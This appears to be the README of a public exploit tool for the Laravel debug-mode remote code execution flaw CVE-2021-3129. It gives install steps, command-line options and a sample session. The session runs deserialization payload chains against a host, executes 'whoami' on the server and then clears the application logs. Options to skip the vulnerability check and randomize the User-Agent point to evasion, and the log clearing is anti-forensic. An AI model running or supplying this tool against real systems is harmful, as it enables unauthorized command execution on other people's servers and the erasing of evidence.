# CVE-2021-3129 - Laravel RCE

## About
The script has been made for exploiting the Laravel RCE (CVE-2021-3129) vulnerability.<br>
This script allows you to write/execute commands on a website running <b>Laravel <= v8.4.2</b>, that has "APP_DEBUG" set to "true" in its ".env" file.

It currently has support for <b>searching the log file</b>, <b>executing commands</b>, <b>writing to the log file</b>, and support for <b>clearing log files</b>.

## Setup
```bash

$ pip install -r requirements.txt
$ python3 CVE-2021-3129.py --help
```

## Options
```bash
usage: CVE-2021-3129.py [-h] [--host HOST] [--force] [--log LOG] [--ua] [--chain CHAIN] [--chains] [--php PHP]

Exploit CVE-2021-3129 - Laravel vulnerability exploit script

options:
  -h, --help     show this help message and exit
  --host HOST    Host URL to use exploit on
  --force        Force exploit without checking if vulnerable
  --log LOG      Full path to laravel.log file (e.g. /var/www/html/storage/logs/laravel.log)
  --ua           Randomize User-Agent for requests
  --chain CHAIN  Select PHPGGC chain. Use "--chains" parameter to view all available chains.
  --chains       View available chains for the "--chain" parameter
  --php PHP      Path to PHP executable
```

## Example
```bash
$ python3 CVE-2021-3129.py --host="http://0.0.0.0/"
Laravel Debug Mode CVE script
[•] Made by: https://github.com/joshuavanderpoll/CVE-2021-3129
[•] Using PHPGGC: https://github.com/ambionics/phpggc
[@] Starting exploit on "http://0.0.0.0/"...
[@] Testing vulnerable URL http://0.0.0.0/_ignition/execute-solution...
[√] Host seems vulnerable!
[@] Searching Laravel log file path...
[•] Laravel seems to be running on a Windows based machine.
[√] Laravel log found: "C:\inetpub\wwwroot\Laravel_RCE_POC\storage\logs\laravel.log".
[•] Laravel version found: "7.30.4".
[•] Use "?" for a list of all possible actions.
[?] Please enter a command to execute: execute whoami
[@] Executing command "whoami"...
[@] Generating payloads...
[√] Generated 12 payloads.
[@] Trying chain laravel/rce1 [1/12]...
[@] Clearing logs...
[@] Causing error in logs...
[√] Caused error in logs.
[@] Sending payloads...
[√] Sent payload.
[@] Converting payload...
[√] Converted payload.
[!] Failed execution of payload.
Error: "file_get_contents(phar://C:\inetpub\wwwroot\Laravel_RCE_POC\storage\logs\laravel.log): failed to open stream: internal corruption of phar &amp;quot;C:\inetpub\wwwroot\Laravel_RCE_POC\storage\logs\laravel.log&amp;quot; (truncated entry)".
[?] Do you want to try the next chain? [Y/N] : y
...
[@] Trying chain laravel/rce8 [6/12]...
[@] Clearing logs...
[@] Causing error in logs...
[√] Caused error in logs.
[@] Sending payloads...
[√] Sent payload.
[@] Converting payload...
[√] Converted payload.
[√] Result:

autorite nt\iusr

[@] Clearing logs...
[?] Do you want to try the next chain? [Y/N] : n
[?] Please enter a command to execute: clear_logs
[@] Clearing Laravel logs...
[√] Cleared Laravel logs!
```
